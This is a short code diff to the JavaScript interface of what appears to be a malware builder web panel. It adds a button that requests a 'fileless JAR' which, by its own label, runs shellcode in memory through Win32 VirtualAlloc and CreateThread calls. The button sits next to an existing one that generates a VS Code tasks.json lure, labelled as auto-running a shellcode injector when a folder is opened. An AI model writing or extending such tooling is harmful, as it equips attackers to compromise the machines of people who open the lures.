@@ -1308,6 +1308,14 @@ function showBuildFiles(files, buildId, expiresAt) {
       tasksBtn.title = "Generate VS Code tasks.json lure — auto-runs shellcode injector on folder open";
       tasksBtn.innerHTML = '<i class="fa-solid fa-code"></i> tasks.json';
       btnRow.appendChild(tasksBtn);
+
+      const jarBtn = document.createElement("a");
+      jarBtn.href = `/api/build/jar/${encodeURIComponent(file.name)}`;
+      jarBtn.className =
+        "inline-flex items-center gap-1 px-3 py-1 rounded bg-orange-700 hover:bg-orange-800 text-white text-sm transition-colors";
+      jarBtn.title = "Generate fileless JAR — executes shellcode in-memory via JNA Win32 API (VirtualAlloc + CreateThread)";
+      jarBtn.innerHTML = '<i class="fa-solid fa-archive"></i> JAR';
+      btnRow.appendChild(jarBtn);
     }
 
     fileDiv.appendChild(fileInfo);
